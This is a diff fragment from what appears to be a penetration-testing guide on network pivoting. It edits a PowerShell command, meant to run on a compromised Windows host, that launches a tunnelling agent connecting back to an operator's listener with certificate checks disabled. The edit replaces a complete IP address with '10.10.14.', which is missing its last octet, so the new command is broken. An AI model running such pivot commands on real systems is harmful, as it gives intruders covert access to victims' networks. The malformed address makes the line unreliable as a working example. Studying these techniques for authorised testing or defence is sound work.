@@ -174,7 +174,7 @@ wget ...
 On the compromised Windows host:
 
 ```powershell
-.\agent.exe -connect 192.168.1.107:11601 -ignore-cert
+.\agent.exe -connect 10.10.14.:11601 -ignore-cert
 ```
 
 ### Options
